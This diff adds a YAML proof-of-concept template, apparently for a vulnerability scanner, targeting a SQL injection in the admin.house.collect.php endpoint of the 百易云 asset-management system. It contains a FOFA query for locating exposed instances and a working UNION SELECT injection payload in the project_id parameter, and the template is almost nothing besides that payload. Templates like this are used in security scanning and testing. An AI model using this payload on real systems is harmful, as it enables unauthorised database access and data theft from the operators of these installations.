@@ -1,0 +1,17 @@
+id: poc-yaml-baiyishequ-adminhouse-collect-sqli
+info:
+  name: 百易云资产管理运营系统 admin.house.collect.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 百易云资产管理运营系统
+  fofa: title="资管云"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /wuser/admin.house.collect.php?project_id=1)+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,md5({{.t1}}),0x7e),NULL,NULL,NULL,NULL,NULL,NULL--+-
+  expression: "status_code == 200 && \ncontains(body,t2) &&\ncontains(body,\"building_code=\"\
+    )\n"
+transport: http
